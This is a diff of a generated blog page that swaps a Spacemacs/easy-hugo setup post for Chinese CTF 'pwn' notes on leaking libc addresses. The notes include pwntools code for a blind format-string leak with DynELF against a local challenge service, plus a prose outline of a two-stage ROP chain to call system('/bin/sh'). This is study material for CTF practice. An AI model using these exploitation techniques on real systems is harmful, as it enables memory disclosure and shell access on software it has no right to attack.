@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>用easy-hugo在spacemacs中写hugo博客 | Iluvata&#39;s Blog</title>
+    <title>libc泄漏 | Iluvata&#39;s Blog</title>
 
     
 
@@ -17,22 +17,26 @@
 
 <meta name="generator" content="Hugo 0.87.0" />
 
-<link rel="canonical" href="https://iluvata.github.io/post/2021-02-02_hugo-with-emacs/" />
+<link rel="canonical" href="https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/" />
 
 
-<meta property="og:title" content="用easy-hugo在spacemacs中写hugo博客" />
-<meta property="og:description" content="配置easy-hugo layer  我在github上找到有人写了spacemacs的easy-hugo layer，可以直接用，地址在这里. 把这个仓库中的 packages.el 放到自己的 .emacs.d/private/hugo 文件夹下就可以了. 然后在 .spacemacs 文件中的 dotspacemacs-configuration-layers 中添加 hugo 层.  这时候如果直接运行 M-x easy-hugo 会提示找不到 easy-hugo-basedir ，在.spacemacs 文件夹下的 user-config 项中加上 (setq easy-hugo-basedir &#34;your-path-to-hugo-basedir&#34;) 重新载入就可以运行了。   运行指南  在输入 M-x easy-hugo 进入easy-hugo mode 后，这个layer已经帮我们重新绑定了几个快捷键    Key Binding Description     SPC m n &#39;easy-hugo-newpost   SPC m D &#39;easy-hugo-article   SPC m p &#39;easy-hugo-preview   SPC m P &#39;easy-hugo-publish   SPC m o &#39;easy-hugo-open   SPC m d &#39;easy-hugo-delete~   SPC m c &#39;easy-hugo-open-config   SPC m f &#39;easy-hugo-open   SPC m N &#39;easy-hugo-no-help   SPC m v &#39;easy-hugo-view   SPC m r &#39;easy-hugo-refresh   SPC m s &#39;easy-hugo-sort-time   SPC m S &#39;easy-hugo-sort-char   SPC m G &#39;easy-hugo-github-deploy   SPC m A &#39;easy-hugo-amazon-s3-deploy   SPC m C &#39;easy-hugo-google-cloud-storage-deploy   SPC m q &#39;evil-delete-buffer     如果记不住，按下 SPC 后就会有提示  比如 SPC m n 创建新文章" />
+<meta property="og:title" content="libc泄漏" />
+<meta property="og:description" content="libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
+格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
+def leak(addr): p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;) p.recvline() payload = &#34;%9$s.AAA&#34; &#43; p32(addr) p.sendline(payload) data = p.recvuntil(&#34;.AAA&#34;)[:-4] &#43; &#34;\x00&#34; log.info(&#34;leaking: 0x%x--&gt; %s&#34; % (addr, data.encode(&#39;hex&#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&#39;system&#39;, &#39;libc&#39;) printf_addr = data.lookup(&#39;printf&#39;, &#39;libc&#39;) log.info(&#34;system address: 0x%x&#34; % system_addr) log.info(&#34;printf address: 0x%x&#34; % printf_addr)   DynELF 不要求我们拿到 libc." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://iluvata.github.io/post/2021-02-02_hugo-with-emacs/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-02-02T21:52:48+08:00" />
-<meta property="article:modified_time" content="2021-02-02T21:52:48+08:00" />
+<meta property="og:url" content="https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-11-10T12:35:39+08:00" />
+<meta property="article:modified_time" content="2021-11-10T12:35:39+08:00" />
 
 
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="用easy-hugo在spacemacs中写hugo博客"/>
-<meta name="twitter:description" content="配置easy-hugo layer  我在github上找到有人写了spacemacs的easy-hugo layer，可以直接用，地址在这里. 把这个仓库中的 packages.el 放到自己的 .emacs.d/private/hugo 文件夹下就可以了. 然后在 .spacemacs 文件中的 dotspacemacs-configuration-layers 中添加 hugo 层.  这时候如果直接运行 M-x easy-hugo 会提示找不到 easy-hugo-basedir ，在.spacemacs 文件夹下的 user-config 项中加上 (setq easy-hugo-basedir &#34;your-path-to-hugo-basedir&#34;) 重新载入就可以运行了。   运行指南  在输入 M-x easy-hugo 进入easy-hugo mode 后，这个layer已经帮我们重新绑定了几个快捷键    Key Binding Description     SPC m n &#39;easy-hugo-newpost   SPC m D &#39;easy-hugo-article   SPC m p &#39;easy-hugo-preview   SPC m P &#39;easy-hugo-publish   SPC m o &#39;easy-hugo-open   SPC m d &#39;easy-hugo-delete~   SPC m c &#39;easy-hugo-open-config   SPC m f &#39;easy-hugo-open   SPC m N &#39;easy-hugo-no-help   SPC m v &#39;easy-hugo-view   SPC m r &#39;easy-hugo-refresh   SPC m s &#39;easy-hugo-sort-time   SPC m S &#39;easy-hugo-sort-char   SPC m G &#39;easy-hugo-github-deploy   SPC m A &#39;easy-hugo-amazon-s3-deploy   SPC m C &#39;easy-hugo-google-cloud-storage-deploy   SPC m q &#39;evil-delete-buffer     如果记不住，按下 SPC 后就会有提示  比如 SPC m n 创建新文章"/>
+<meta name="twitter:title" content="libc泄漏"/>
+<meta name="twitter:description" content="libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
+格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
+def leak(addr): p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;) p.recvline() payload = &#34;%9$s.AAA&#34; &#43; p32(addr) p.sendline(payload) data = p.recvuntil(&#34;.AAA&#34;)[:-4] &#43; &#34;\x00&#34; log.info(&#34;leaking: 0x%x--&gt; %s&#34; % (addr, data.encode(&#39;hex&#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&#39;system&#39;, &#39;libc&#39;) printf_addr = data.lookup(&#39;printf&#39;, &#39;libc&#39;) log.info(&#34;system address: 0x%x&#34; % system_addr) log.info(&#34;printf address: 0x%x&#34; % printf_addr)   DynELF 不要求我们拿到 libc."/>
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -108,7 +112,7 @@
     <section class="ui top attached segment">
       <header>
         <h1 class="ui large header">
-          用easy-hugo在spacemacs中写hugo博客
+          libc泄漏
           <div class="sub header">
             @
             
@@ -116,139 +120,91 @@
             
 
             | 
-                Tuesday, Feb 2, 2021
+                Wednesday, Nov 10, 2021
               
 
             | 1 minutes read
 
             | Update at
               
-                Tuesday, Feb 2, 2021
+                Wednesday, Nov 10, 2021
               
           </div>
         </h1>
       </header>
 
       <article class="main">
+<p>
+libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。
+ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。
+fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。
+堆利用中也会有用system覆盖函数got的利用方式。</p>
 <div id="outline-container-headline-1" class="outline-2">
 <h2 id="headline-1">
-配置easy-hugo layer
+格式化字符串漏洞
 </h2>
 <div id="outline-text-headline-1" class="outline-text-2">
-<p>我在github上找到有人写了spacemacs的easy-hugo layer，可以直接用，地址在<a href="https://github.com/humanfactors/spacemacs-easy-hugo">这里</a>. 
-把这个仓库中的 <code class="verbatim">packages.el</code> 放到自己的 <code class="verbatim">.emacs.d/private/hugo</code> 文件夹下就可以了.
-然后在 <code class="verbatim">.spacemacs</code> 文件中的 <code class="verbatim">dotspacemacs-configuration-layers</code> 中添加 <code class="verbatim">hugo</code> 层. </p>
+<div id="outline-container-headline-2" class="outline-3">
+<h3 id="headline-2">
+NJCTF2017 <a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md">pingme</a>
+</h3>
+<div id="outline-text-headline-2" class="outline-text-3">
+<p>这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。
+如果libc-database搜不到，可以用DynELF来泄漏system地址。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
+    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#e6db74">&#39;10001&#39;</span>)
+    p<span style="color:#f92672">.</span>recvline()
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%9$s.AAA&#34;</span> <span style="color:#f92672">+</span> p32(addr)
+    p<span style="color:#f92672">.</span>sendline(payload)
+    data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;.AAA&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;leaking: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74"> --&gt; </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (addr, data<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;hex&#39;</span>)))
+    p<span style="color:#f92672">.</span>close()
+    <span style="color:#66d9ef">return</span> data
+data <span style="color:#f92672">=</span> DynELF(leak, <span style="color:#ae81ff">0x08048490</span>)     <span style="color:#75715e"># Entry point address</span>
+system_addr <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;libc&#39;</span>)
+printf_addr <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;printf&#39;</span>, <span style="color:#e6db74">&#39;libc&#39;</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system address: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> system_addr)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;printf address: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> printf_addr)</code></pre></div>
+</div>
 <p>
-这时候如果直接运行 <code class="verbatim">M-x easy-hugo</code> 会提示找不到 <code class="verbatim">easy-hugo-basedir</code> ，在.spacemacs 
-文件夹下的 <code class="verbatim">user-config</code> 项中加上 <code class="verbatim">(setq easy-hugo-basedir &#34;your-path-to-hugo-basedir&#34;)</code> 
-重新载入就可以运行了。 </p>
+DynELF 不要求我们拿到 libc.so，所以如果我们查询不到 libc.so 的版本信息，该模块就能发挥它最大的作用  。</p>
 </div>
 </div>
-<div id="outline-container-headline-2" class="outline-2">
-<h2 id="headline-2">
-运行指南 
-</h2>
-<div id="outline-text-headline-2" class="outline-text-2">
-<p>在输入 <code class="verbatim">M-x easy-hugo</code> 进入easy-hugo mode 后，这个layer已经帮我们重新绑定了几个快捷键 </p>
-<table>
-<thead>
-<tr>
-<th>Key Binding</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>SPC m n</code></td>
-<td>&#39;easy-hugo-newpost</td>
-</tr>
-<tr>
-<td><code>SPC m D</code></td>
-<td>&#39;easy-hugo-article</td>
-</tr>
-<tr>
-<td><code>SPC m p</code></td>
-<td>&#39;easy-hugo-preview</td>
-</tr>
-<tr>
-<td><code>SPC m P</code></td>
-<td>&#39;easy-hugo-publish</td>
-</tr>
-<tr>
-<td><code>SPC m o</code></td>
-<td>&#39;easy-hugo-open</td>
-</tr>
-<tr>
-<td><code>SPC m d</code></td>
-<td>&#39;easy-hugo-delete~</td>
-</tr>
-<tr>
-<td><code>SPC m c</code></td>
-<td>&#39;easy-hugo-open-config</td>
-</tr>
-<tr>
-<td><code>SPC m f</code></td>
-<td>&#39;easy-hugo-open</td>
-</tr>
-<tr>
-<td><code>SPC m N</code></td>
-<td>&#39;easy-hugo-no-help</td>
-</tr>
-<tr>
-<td><code>SPC m v</code></td>
-<td>&#39;easy-hugo-view</td>
-</tr>
-<tr>
-<td><code>SPC m r</code></td>
-<td>&#39;easy-hugo-refresh</td>
-</tr>
-<tr>
-<td><code>SPC m s</code></td>
-<td>&#39;easy-hugo-sort-time</td>
-</tr>
-<tr>
-<td><code>SPC m S</code></td>
-<td>&#39;easy-hugo-sort-char</td>
-</tr>
-<tr>
-<td><code>SPC m G</code></td>
-<td>&#39;easy-hugo-github-deploy</td>
-</tr>
-<tr>
-<td><code>SPC m A</code></td>
-<td>&#39;easy-hugo-amazon-s3-deploy</td>
-</tr>
-<tr>
-<td><code>SPC m C</code></td>
-<td>&#39;easy-hugo-google-cloud-storage-deploy</td>
-</tr>
-<tr>
-<td><code>SPC m q</code></td>
-<td>&#39;evil-delete-buffer</td>
-</tr>
-</tbody>
-</table>
-<p>
-如果记不住，按下 <code class="verbatim">SPC</code> 后就会有提示 </p>
-<p>
-比如 <code class="verbatim">SPC m n</code> 创建新文章</p>
-<p>
-<code class="verbatim">SPC m p</code> 查看文章预览</p>
 </div>
 </div>
 <div id="outline-container-headline-3" class="outline-2">
 <h2 id="headline-3">
-layer解析
+ROP
 </h2>
 <div id="outline-text-headline-3" class="outline-text-2">
-<p>这个配置的代码不是很复杂，可以来稍微看一下 </p>
-<div class="src src-emacs-lisp">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-emacs-lisp" data-lang="emacs-lisp">(defconst hugo-packages
-  <span style="color:#f92672">&#39;</span>(easy-hugo))</code></pre></div>
+<div id="outline-container-headline-4" class="outline-3">
+<h3 id="headline-4">
+geekgame-0th <a href="https://github.com/PKU-GeekGame/geekgame-0th/blob/main/writeups/wp-xmcp/wp-xmcp.md">庄子的回文</a>
+</h3>
+<div id="outline-text-headline-4" class="outline-text-3">
+<p>这题需要利用ropchain打印出任意函数的got，计算出libc的偏移后回到函数执行入口，再次执行rop，用ropchain构造system(&#34;/bin/sh&#34;)就可以得到shell。第一次打印出函数got的ropchain是用目标elf文件中指令构造的，拿到libcbase后才能用libc中的指令构造第二次rop。这题要用两次rop是因为原elf文件不能直接构造出system(&#34;/bin/sh&#34;).</p>
 </div>
-<p>hugo-packages中指定了这个layer需要的package，本次只指定了一个package: easy-hugo. 继续往下看发现在 <code class="verbatim">set-leader-keys-for-major-mode</code> 中绑定了 <code class="verbatim">easy-hugo-mode</code> 作为主要mode时的一些快捷键. </p>
-<p>
-所以这个layer基本上就是对 <code class="verbatim">easy-hugo</code> package 中的一些快捷键进行了自定义，进一步的资料可以查看<a href="https://github.com/masasam/emacs-easy-hugo">easy-hugo</a>文档.</p>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-5" class="outline-2">
+<h2 id="headline-5">
+main arena
+</h2>
+<div id="outline-text-headline-5" class="outline-text-2">
+<div id="outline-container-headline-6" class="outline-3">
+<h3 id="headline-6">
+字符串非&#39;\x00&#39;结尾
+</h3>
+<div id="outline-text-headline-6" class="outline-text-3">
+<div id="outline-container-headline-7" class="outline-4">
+<h4 id="headline-7">
+HITBCTF2018 <a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md">gundam</a>
+</h4>
+</div>
+</div>
+</div>
 </div>
 </div>
 </article>
@@ -257,9 +213,9 @@ layer解析
     <footer class="ui attached segment dream-tags" data-html2canvas-ignore>
       
         
-          <a class="ui label" href="/tags/emacs" title="emacs">emacs</a>
+          <a class="ui label" href="/tags/ctf" title="ctf">ctf</a>
         
-          <a class="ui label" href="/tags/hugo" title="hugo">hugo</a>
+          <a class="ui label" href="/tags/pwn" title="pwn">pwn</a>
         
       
       <div
@@ -285,11 +241,27 @@ layer解析
       <div class="ui segment toc">
         <nav id="TableOfContents">
 <ul>
-<li><a href="#headline-1">配置easy-hugo layer</a>
+<li><a href="#headline-1">格式化字符串漏洞</a>
+<ul>
+<li><a href="#headline-2">NJCTF2017 pingme</a>
 </li>
-<li><a href="#headline-2">运行指南 </a>
+</ul>
 </li>
-<li><a href="#headline-3">layer解析</a>
+<li><a href="#headline-3">ROP</a>
+<ul>
+<li><a href="#headline-4">geekgame-0th 庄子的回文</a>
+</li>
+</ul>
+</li>
+<li><a href="#headline-5">main arena</a>
+<ul>
+<li><a href="#headline-6">字符串非&#39;\x00&#39;结尾</a>
+<ul>
+<li><a href="#headline-7">HITBCTF2018 gundam</a>
+</li>
+</ul>
+</li>
+</ul>
 </li>
 </ul>
 </nav>
